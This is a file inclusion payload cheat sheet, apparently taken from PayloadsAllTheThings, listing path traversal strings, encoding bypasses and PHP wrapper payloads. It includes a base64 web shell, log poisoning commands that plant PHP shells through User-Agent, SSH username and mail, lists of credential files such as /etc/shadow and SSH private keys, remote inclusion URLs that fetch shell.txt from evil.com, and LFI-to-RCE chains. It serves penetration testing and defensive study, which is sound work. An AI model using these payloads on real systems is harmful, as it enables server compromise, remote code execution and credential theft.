# File Inclusion (LFI/RFI) Payloads

> Source: PayloadsAllTheThings — File Inclusion

## Path Traversal Sequences

```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..///////..////..//////etc/passwd
```

### Encoding Variants

```
# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# UTF-8 overlong encoding
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.jpg

# Path truncation (4096+ chars, PHP < 5.3)
../../../etc/passwd/./././././.[repeat to 4096+ chars]
../../../etc/passwd............[repeat to 4096+ chars]
```

## PHP Wrapper Techniques

### php://filter (Source Code Disclosure)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

### php://input (POST Data as File)

```
POST /vuln.php?page=php://input HTTP/1.1
Content-Type: text/plain

<?php system('id'); ?>
```

### data:// (Inline Code Execution)

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
data://text/plain,<?php system('id'); ?>
```

### expect:// (Command Execution)

```
expect://id
expect://ls
```

Requires `expect` extension to be loaded.

### zip:// and phar://

```
# Upload a ZIP containing a PHP file, then include it
zip://uploads/evil.zip%23shell.php
phar://uploads/evil.phar/shell.php
```

## Log Poisoning

### Apache Access Log

```bash
# Step 1: Poison the log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log file
http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id
```

### Apache Error Log

```
http://target.com/vuln.php?page=/var/log/apache2/error.log
```

### SSH Auth Log

```bash
# Step 1: Poison via SSH username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: Include
http://target.com/vuln.php?page=/var/log/auth.log&cmd=id
```

### Mail Log

```bash
# Step 1: Send email with PHP payload in subject
mail -s '<?php system($_GET["cmd"]); ?>' www-data@target.com < /dev/null

# Step 2: Include
http://target.com/vuln.php?page=/var/log/mail.log&cmd=id
```

### /proc/self/environ

```
http://target.com/vuln.php?page=/proc/self/environ
```

Poison via `User-Agent` header containing PHP code.

## Interesting Files — Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/[user]/.bash_history
/home/[user]/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
```

## Interesting Files — Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\system32\license.rtf
C:\windows\repair\sam
C:\windows\repair\system
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
```

## Remote File Inclusion (RFI)

```
http://target.com/vuln.php?page=http://evil.com/shell.txt
http://target.com/vuln.php?page=http://evil.com/shell.txt%00
http://target.com/vuln.php?page=http:%252f%252fevil.com%252fshell.txt

# SMB share (Windows — bypasses allow_url_include)
http://target.com/vuln.php?page=\\10.0.0.1\share\shell.php
```

## LFI to RCE Chains

```
1. LFI + Log Poisoning         -> RCE via log file inclusion
2. LFI + /proc/self/environ    -> RCE via User-Agent injection
3. LFI + php://input           -> RCE via POST body
4. LFI + data://               -> RCE via inline PHP
5. LFI + PHP session files     -> RCE via session poisoning
   /tmp/sess_[SESSIONID] or /var/lib/php/sessions/sess_[SESSIONID]
6. LFI + Upload                -> RCE via uploaded file inclusion
7. LFI + phar://               -> RCE via deserialization
```
